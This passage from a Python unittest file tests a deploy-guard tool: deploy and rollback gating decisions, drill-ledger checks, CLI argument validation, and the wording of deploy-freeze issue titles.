        self.assertTrue(decide(ctx(client=True, skippable=True))["message"].startswith("skip:"))

    def test_rollbacks_and_drills_are_never_held_by_the_client_rules(self):
        self.assertTrue(decide(ctx(client=True, reason="rollback", sha=A))["go"])
        self.assertTrue(decide(ctx(client=True, env="drill"))["go"])

    def test_gather_reads_the_drill_ledger_only_for_client_production(self):
        deps = [rec(A, "success", {"build": BUILD_A})]
        for drill, green in (([rec(B, "success", {"build": BUILD_B})], True), ([rec(B, "failure", {})], False),
                             ([rec(B, "success", {"build": BUILD_B}, MALLORY)], False), ([], False)):
            with self.subTest(drill=drill):
                c, _ = gather_with(deps, drill=drill, extra=([], True, True))
                self.assertIs(c["drill_green"], green)
                self.assertIs(c["ping_configured"], True)
        c, calls = gather_with(deps, drill=[rec(B, "success", {"build": BUILD_B})])
        self.assertFalse(c["drill_green"])
        self.assertNotIn("drill", [x[1] for x in calls if x[0] == "ledger"])

    def test_decide_cli_takes_client_and_ping(self):
        seen = []
        with mock.patch.object(deploy_guard, "gather", lambda *a: seen.append(a) or ctx()), \
                contextlib.redirect_stdout(io.StringIO()):
            deploy_guard.main(["decide", "--repo", "o/r", "--sha", B, "--reason", "deploy", "--env", "production",
                               "--current-build", json.dumps(BUILD_B), "--client", "--ping-configured"])
        self.assertEqual(seen[0][8:], (True, True))


class RollbackPrecheck(unittest.TestCase):
    """bin/rollback asks the guard before it opens a freeze; a CF target needs its own trusted record."""

    def test_recorded_build_only_checks_the_targets_record_without_current_inputs(self):
        self.assertTrue(decide(ctx(reason="rollback", sha=A, current_build={}, target_build=BUILD_A))["go"])
        d = decide(ctx(reason="rollback", sha=A, current_build={}, target_build=None))
        self.assertFalse(d["go"])
        self.assertIn("no recorded build params", d["message"])

    def test_recorded_build_only_cli(self):
        seen = []
        with mock.patch.object(deploy_guard, "gather", lambda *a: seen.append(a) or ctx(reason="rollback", sha=A)), \
                contextlib.redirect_stdout(io.StringIO()):
            deploy_guard.main(["decide", "--repo", "o/r", "--sha", A, "--reason", "rollback", "--env", "production",
                               "--recorded-build-only"])
        self.assertEqual(seen[0][6], {})
        for bad in (["--reason", "deploy", "--recorded-build-only"],
                    ["--reason", "rollback", "--recorded-build-only", "--current-build", json.dumps(BUILD_A)]):
            with self.subTest(bad=bad), contextlib.redirect_stderr(io.StringIO()), self.assertRaises(SystemExit), \
                    mock.patch.object(deploy_guard, "gather", side_effect=AssertionError("must fail before gather")):
                deploy_guard.main(["decide", "--repo", "o/r", "--sha", A, "--env", "production", *bad])


class FreezeTitles(unittest.TestCase):
    """A freeze never says "rolled back" when nothing verified (deferred minor, mapped to Task 5)."""

    def opened(self, **kw):
        made = []

        def fake_gh(*args, stdin=None):
            made.append(args)
            return "https://github.com/BJGLLC/r/issues/9"
        a = types.SimpleNamespace(repo="BJGLLC/r", env="production", frm=B, to=A, run_url="https://run", **kw)
        with mock.patch.object(deploy_guard, "gh", fake_gh):
            deploy_guard.freeze_open(a)
        issue = next(c for c in made if c[:2] == ("issue", "create"))
        return issue[issue.index("--title") + 1], issue[issue.index("--body") + 1]

    def test_rollback_failed_says_live_is_unknown(self):
        title, body = self.opened(state="rollback-failed")
        self.assertEqual(title, "deploy-freeze [production]: bbbbbbb did not verify; live state unknown")
        self.assertIn("UNKNOWN", body)
        self.assertIn("`aaaaaaa`", body)

    def test_bin_rollback_freeze_says_what_is_being_attempted(self):
        title, body = self.opened(state="manual")
        self.assertEqual(title, "deploy-freeze [production]: bin/rollback from bbbbbbb to aaaaaaa")
        self.assertIn("bin/rollback", body)
        self.assertNotIn("was rolled back", body)

    def test_auto_rolled_back_keeps_the_old_title(self):
        self.assertEqual(self.opened(state="auto-rolled-back")[0], "deploy-freeze [production]: rolled back from bbbbbbb")
        self.assertEqual(self.opened()[0], "deploy-freeze [production]: rolled back from bbbbbbb")

    def test_freeze_open_cli_rejects_unknown_states(self):
        with contextlib.redirect_stderr(io.StringIO()), self.assertRaises(SystemExit), \
                mock.patch.object(deploy_guard, "gh", side_effect=AssertionError("no gh")):
            deploy_guard.main(["freeze-open", "--repo", "o/r", "--env", "production", "--from", B, "--to", A,
                               "--run-url", "x", "--state", "bogus"])


if __name__ == "__main__":
    unittest.main()
